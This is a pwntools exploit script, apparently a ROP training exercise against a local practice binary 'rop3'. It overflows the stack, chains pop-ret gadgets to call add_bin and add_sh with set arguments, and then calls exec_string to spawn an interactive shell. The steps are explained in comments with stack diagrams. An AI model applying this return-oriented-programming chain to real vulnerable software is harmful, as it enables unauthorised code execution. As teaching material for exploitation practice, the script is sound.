#!/usr/bin/env python2

from pwn import *

context(os = 'linux', arch = 'i386', terminal = 'xterm')
binary = 'rop3'

debug = False
crash = False

if 'DEBUG' in args:
    debug = True
    context.log_level = 0

if 'CRASH' in args:
    crash = True
    debug = True

elf = ELF(binary)

#EAX: 0xffd5c2cc ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa\034\303\325\377")
#EBX: 0x0 
#ECX: 0xffd5cc00 ("yaab")
#EDX: 0xffd5c390 ("yaab")
#ESI: 0x2 
#EDI: 0xf77b1000 --> 0x1b4d90 
#EBP: 0x62616163 ('caab')
#ESP: 0xffd5c340 ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
#EIP: 0x62616164 ('daab')

log.info('exec_string found at 0x' + format(elf.symbols['exec_string'], '02x'))
log.info('add_bin found at 0x' + format(elf.symbols['add_bin'], '02x'))
log.info('add_sh found at 0x' + format(elf.symbols['add_sh'], '02x'))
log.info('string found at 0x' + format(elf.symbols['string'], '02x'))

# ROPgadget --binary rop3
popret = p32(0x080482ed) # : pop ebx ; ret
poppopret = p32(0x0804848d) # : pop edi ; pop ebp ; ret

#0xdeadbeef + add_bin 0xcafebabe + 0x0badf00d + add_sh + exec_string

# | <argument>       |
# | <return address> |
# In our case, we want the argument to be 0xdeadbeef we want the return address to be a pop; ret gadget. This will remove 0xdeadbeef from the stack and return to the next gadget on the stack. We thus have a gadget to call add_bin(0xdeadbeef) that looks like:
# 
# | 0xdeadbeef            |
# | <address of pop; ret> |
# | <address of add_bin>  |
# Since add_sh(0xcafebabe, 0x0badf00d) use two arguments, we need a pop; pop; ret:
# 
# | 0x0badf00d                 |
# | 0xcafebabe                 |
# | <address of pop; pop; ret> |
# | <address of add_sh>        |
# When we put these together, our payload looks like:
# 
# | <address of exec_string>     |
# | 0x0badf00d                   |
# | 0xcafebabe                   |
# | <address of pop; pop; ret>   |
# | <address of add_sh>          |
# | 0xdeadbeef                   |
# | <address of pop; ret>        |
# | <address of add_bin>         |
# | 0x42424242 (fake saved %ebp) |
# | 0x41414141 ...               |
# |   ... (0x6c bytes of 'A's)   |
# |   ... 0x41414141             |

payload = "A"*(cyclic_find(0x62616163))
payload += "BBBB"          # fake ret address

# add_bin(0xdeadbeef)
payload += p32(elf.symbols['add_bin']) 
payload += popret
payload += p32(0xdeadbeef)

# add_sh(0xcafebabe, 0x0badf00d)
payload += p32(elf.symbols['add_sh']) 
payload += poppopret
payload += p32(0xcafebabe)
payload += p32(0x0badf00d)

payload += p32(elf.symbols['exec_string']) # 0x8048570

if crash:
    payload = cyclic(200)

if debug:
    r = gdb.debug([binary, payload])
    pause()
    sys.exit(0)
else:
    log.info(payload)
    r = process(binary + " " + payload, shell=True)

r.clean()
r.interactive()

